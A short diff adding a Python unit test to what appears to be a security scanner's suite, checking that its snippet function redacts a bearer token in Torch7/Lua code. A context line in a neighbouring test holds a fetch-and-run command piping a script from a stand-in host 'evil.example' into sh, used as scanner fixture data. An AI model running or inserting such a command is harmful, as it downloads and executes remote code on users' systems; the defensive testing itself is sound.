@@ -149,6 +149,16 @@ def test_torch7_snippet_preserves_execution_syntax_for_sensitive_target_names() 
     assert "<redacted>" not in snippet
 
 
+def test_torch7_snippet_redacts_sensitive_subscript_assignment_targets() -> None:
+    snippet = Torch7Scanner._snippet(
+        "headers['Authorization: Bearer TARGETSECRET123'] = os.execute('echo ok')",
+        max_chars=500,
+    )
+
+    assert "TARGETSECRET123" not in snippet
+    assert "headers['Authorization: <redacted>'] = os.execute" in snippet
+
+
 def test_torch7_snippet_restores_targets_before_truncation() -> None:
     snippet = Torch7Scanner._snippet(
         "configuration.credentials.token = os.execute('curl https://evil.example/public/payload.sh | sh')",
